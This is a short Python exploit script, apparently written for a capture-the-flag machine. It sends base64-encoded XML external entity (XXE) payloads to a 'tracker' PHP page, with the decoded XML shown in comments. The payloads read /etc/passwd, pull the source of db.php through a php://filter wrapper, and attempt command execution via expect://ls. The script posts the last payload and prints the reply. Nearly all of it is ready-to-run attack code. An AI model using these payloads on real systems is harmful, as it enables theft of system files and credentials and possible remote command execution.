import requests

url = "http://10.10.11.100/tracker_diRbPr00f314.php"

b64_1 = "PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJlcGxhY2UgWzwhRU5USVRZIGFjIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4gXT4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4mYWM7PC90aXRsZT4KCQk8Y3dlPmE8L2N3ZT4KCQk8Y3Zzcz5hPC9jdnNzPgoJCTxyZXdhcmQ+YTwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg=="

'''
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ac SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&ac;</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>a</reward>
		</bugreport>
'''


b64_2 = "PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJlcGxhY2UgWzwhRU5USVRZIGFjIFNZU1RFTSAicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj5dPgogICAgICAgICAgICAgICAgPGJ1Z3JlcG9ydD4KICAgICAgICAgICAgICAgIDx0aXRsZT4mYWM7PC90aXRsZT4KICAgICAgICAgICAgICAgIDxjd2U+YTwvY3dlPgogICAgICAgICAgICAgICAgPGN2c3M+YTwvY3Zzcz4KICAgICAgICAgICAgICAgIDxyZXdhcmQ+YTwvcmV3YXJkPgogICAgICAgICAgICAgICAgPC9idWdyZXBvcnQ+"

'''
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php">]>
		<bugreport>
		<title>&ac;</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>a</reward>
		</bugreport>
'''        


b64_3 = "\
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHRpdGxlIFsgPCFFTEVNRU5UIHRpdGxlIEFOWSA+CjwhRU5USVRZIGFjIFNZU1RFTSAiZXhwZWN0Oi8vbHMiID5dPgogICAgICAgICAgICAgICAgPGJ1Z3JlcG9ydD4KICAgICAgICAgICAgICAgIDx0aXRsZT4mYWM7PC90aXRsZT4KICAgICAgICAgICAgICAgIDxjd2U+YTwvY3dlPgogICAgICAgICAgICAgICAgPGN2c3M+YTwvY3Zzcz4KICAgICAgICAgICAgICAgIDxyZXdhcmQ+YTwvcmV3YXJkPgogICAgICAgICAgICAgICAgPC9idWdyZXBvcnQ+Cg=="
data = {
       'data': b64_3
        }

r = requests.post(url, data=data)

print(r.text)
